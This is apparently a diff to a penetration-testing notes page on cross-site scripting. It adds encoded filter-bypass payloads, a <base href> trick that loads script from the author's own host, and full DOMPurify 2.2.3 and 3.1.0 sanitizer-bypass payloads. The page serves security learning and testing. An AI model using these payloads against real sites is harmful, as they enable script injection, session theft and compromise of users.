@@ -129,33 +129,38 @@ While the above are simple, they are also the most common, and many filters alre
 It is common for dangerous tags to be blacklisted, and any event handler attributes like `onload` and `onerror` to be blocked. There are some payloads however that can _encode_ data to hide these obligatory strings (`&#110;` = HTML-encoded `n`, [CyberChef](https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity\(true,'Numeric%20entities'\)\&input=bg)):
 
 <pre class="language-html" data-overflow="wrap"><code class="lang-html">&#x3C;!-- Dynamically set href= attribute using SVG animation, with "javascript:" partially in attribute value -->
-&#x3C;svg>&#x3C;a>&#x3C;animate attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://example.com?&#x26;semi;javascript:alert(origin)&#x26;semi;0" />&#x3C;text x=20 y=20>XSS&#x3C;/text>&#x3C;/a>
-
+<strong>&#x3C;svg>&#x3C;a>&#x3C;animate attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://example.com?&#x26;semi;javascript:alert(origin)&#x26;semi;0" />&#x3C;text x=20 y=20>XSS&#x3C;/text>&#x3C;/a>
+</strong>
 &#x3C;!-- Using iframe srcdoc= attribute to include encoded HTML -->
 <strong>&#x3C;iframe srcdoc="&#x26;lt;img src=1 o&#x26;#110;error=alert(1)&#x26;gt;">&#x3C;/iframe>
 </strong>
 &#x3C;!-- Link requiring user interaction with javascript: URL -->
-&#x3C;a href="&#x26;#106avas&#x26;#99ript:alert()">Click me!&#x3C;/a>
-</code></pre>
+<strong>&#x3C;a href="&#x26;#106aVaS&#x26;#99riPt:alert()">Click me!&#x3C;/a>
+</strong>
+&#x3C;!-- Using lesser-known src= and data= attributes, also with codebase= -->
+<strong>&#x3C;iframe src="javascript:alert(origin)">&#x3C;/embed>
+</strong><strong>&#x3C;embed src="javascript:alert(origin)">&#x3C;/embed>
+</strong><strong>&#x3C;object data="javascript:alert(origin)">&#x3C;/object>
+</strong>&#x3C;!-- Combination of a URL base and newline to create a new statement -->
+<strong>&#x3C;object data="#!
+</strong><strong>alert(origin)" codebase=javascript:>
+</strong></code></pre>
 
-One last payload is a less well-known tag called `<base>` which takes an `href=` attribute that will decide where any **relative URLs will start** from. If you set this to your domain for example, and later in the document a `<script src="/some/file.js">` is loaded, it will instead be loaded from **your website** at the path of the script.&#x20;
+One last payload is a less well-known tag called `<base>` which takes an `href=` attribute that will decide where any **relative URLs will start** from. If you set this to your domain for example, and later in the document a `<script src="/some/file.js">` is loaded, it will instead be loaded from **your website** at the path of the script.
 
 <pre class="language-html"><code class="lang-html"><strong>&#x3C;base href=//xss.jorianwoltjer.com>
 </strong>
 &#x3C;!-- Any normal relative script after this payload will be taken from the base -->
 &#x3C;script src="/some/file.js">
-&#x3C;!-- ^^ Will fetch 'http://xss.jorianwoltjer.com/some/file.js' instead -->
+&#x3C;!-- ^^ Will fetch 'http://xss.jorianwoltjer.com/some/file.js' instead! -->
 </code></pre>
 
 {% hint style="info" %}
-To exploit and show a proof of concept of the above trick, I set up [this domain](https://xss.jorianwoltjer.com/) that returns the same script for **every path** with any payload you put into that **URL hash**. This means you can include this injection anywhere, and put a JavaScript payload after the `#` symbol of the target URL which will then be executed:
-
-```go
-http://example.com/path#alert(document.domain)
-```
+To exploit and show a proof of concept of the above trick, I set up [xss.jorianwoltjer.com](https://xss.jorianwoltjer.com/) which  returns the same script for **every path** with any payload you put into that **URL hash**. This means you can include this injection anywhere, and put a JavaScript payload after the `#` symbol of the target URL which will then be executed:\
+[http://example.com/path#alert(document.domain)](http://example.com/path#alert\(document.domain\))
 {% endhint %}
 
-See [#filter-bypasses](./#filter-bypasses "mention") for a more broad approach to make your own bypass.
+See [#filter-bypasses](./#filter-bypasses "mention") for a more general approach for making your own bypass.
 
 In case you really can't get a full-blown XSS, check out what other impactful things you may be able to do with [#html-injection](./#html-injection "mention").
 
@@ -798,7 +803,13 @@ The XSS Cheat Sheet by PortSwigger has an extremely comprehensive list of all po
 Filterable list of almost every imaginable HTML that can trigger JavaScript
 {% endembed %}
 
-You can use the above list to filter certain tags you know are allowed/blocked, and copy all payloads for fuzzing using a tool to find what gets through a filter.&#x20;
+You can use the above list to filter certain tags you know are allowed/blocked, and copy all payloads for fuzzing using a tool to find what gets through a filter.
+
+The _Shazzer_ tool is useful for finding fuzzing examples other people have already made, and creating your own ones without worrying about how to iterate through your options. Simply provide a template and an insertion point, and let it try a bunch of variations:
+
+{% embed url="https://shazzer.co.uk/" %}
+Easy to use JavaScript/HTML fuzzing tool with shared results
+{% endembed %}
 
 #### JavaScript payload
 
@@ -920,11 +931,35 @@ Bypasses of versions 3.1.0-3.1.2 using node flattening (credits to [@IcesFont](h
 Common misconfigurations in various later versions
 {% endembed %}
 
-The latest vulnerable _older version 2_ is 2.2.3 with a complete bypass found by [@TheGrandPew](https://twitter.com/TheGrandPew) in _dec. 2020_. The following payload will trigger `alert(origin)` when sanitized and put into any regular part of the DOM:
+The latest vulnerable default version that doesn't use deep nesting is 2.2.3 by [@TheGrandPew](https://twitter.com/TheGrandPew) in _dec. 2020_. The following payload will trigger `alert(origin)` when sanitized and put into any regular part of the DOM:
 
 {% code title="DOMPurify 2.2.3 Bypass" overflow="wrap" %}
 ```html
 <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><style><a title="</style><img src onerror=alert(origin)>">
+```
+{% endcode %}
+
+All versions <= 2.5.2 or <= 3.1.2 are vulnerable by default, here's the payload for **3.1.0** (see the above writeups for variations on later versions):
+
+{% code title="DOMPurify 3.1.0 Bypass" %}
+```html
+<div*506>
+<table>
+  <caption>
+    <svg>
+      <title>
+        <table><caption></caption></table>
+      </title>
+      <style><a id="</style><img src=x onerror=alert(origin)>"></a></style>
+    </svg>
+  </caption>
+</table>
+```
+{% endcode %}
+
+{% code title="Copyable" %}
+```html
+<div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><table><caption><svg><title><table><caption></caption></table></title><style><a id="</style><img src=x onerror=alert(origin)>"></a></style></svg></caption></table>html
 ```
 {% endcode %}
 
